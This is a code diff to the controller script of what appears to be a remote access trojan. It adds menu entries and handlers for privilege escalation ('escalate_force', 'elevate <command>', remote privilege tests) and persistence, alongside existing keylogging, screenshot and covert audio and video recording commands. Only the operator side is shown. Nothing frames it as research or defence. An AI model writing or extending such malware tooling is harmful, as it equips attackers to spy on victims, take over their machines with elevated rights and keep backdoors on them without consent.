@@ -88,8 +88,12 @@ def target_communication():
     print("")
     print("PRIVILEGE ESCALATION:")
     print("   check_privs            - Check current privileges")
-    print("   escalate               - Attempt privilege escalation")
+    print("   escalate               - Attempt REAL privilege escalation")
+    print("   escalate_force         - Force all escalation methods")
+    print("   elevate <command>      - Execute command with elevated privileges")
+    print("   test_admin             - Test if current user is admin")
     print("   privesc_report         - Generate privilege report")
+    print("   remote_privesc_test    - Comprehensive remote privilege test")
     print("")
     print("PERSISTENCE COMMANDS:")
     print("   start_persistence      - Start persistent backdoor (stays running permanently)")
@@ -142,6 +146,44 @@ def target_communication():
                 print(f"Keylog Data:\n{'-'*40}")
                 print(result)
                 print("-"*40)
+        elif command in ['check_privs', 'escalate', 'escalate_force', 'test_admin', 'privesc_report', 'remote_privesc_test'] or command.startswith('elevate '):
+            # Handle privilege escalation commands  
+            result = reliable_recv()
+            if command == 'check_privs':
+                print(f"Current Privileges:\n{'-'*50}")
+                print(result)
+                print("-"*50)
+            elif command in ['escalate', 'escalate_force']:
+                print(f"\n{'='*60}")
+                print("PRIVILEGE ESCALATION ATTEMPT")
+                print(f"{'='*60}")
+                print(result)
+                print(f"{'='*60}")
+            elif command == 'test_admin':
+                print(f"Admin Status: {result}")
+            elif command == 'privesc_report':
+                print(f"Privilege Escalation Report:\n{'-'*50}")
+                print(result)
+                print("-"*50)
+            elif command == 'remote_privesc_test':
+                print(f"\n{'='*80}")
+                print("COMPREHENSIVE REMOTE PRIVILEGE ESCALATION TEST")
+                print(f"{'='*80}")
+                print(result)
+                print(f"{'='*80}")
+            elif command.startswith('elevate '):
+                cmd_run = command[8:]  # Extract the command that was elevated
+                print(f"\n{'='*60}")
+                print(f"ELEVATED COMMAND EXECUTION: {cmd_run}")
+                print(f"{'='*60}")
+                print(result)
+                print(f"{'='*60}")
+        elif command == 'start_persistence':
+            # Handle persistence command
+            result = reliable_recv()
+            print(f"Persistence Result:\n{'-'*40}")
+            print(result)
+            print("-"*40)
         elif command in ['screenshot', 'start_audio', 'stop_audio', 'staaudio', 'stop_audio', 'start_video', 'stop_video', 'start_rt_video', 'stop_video', 'start_recording', 'stop_recording', 'recording_status', 'list_recordings']:
             # Handle recording commands
             result = reliable_recv()
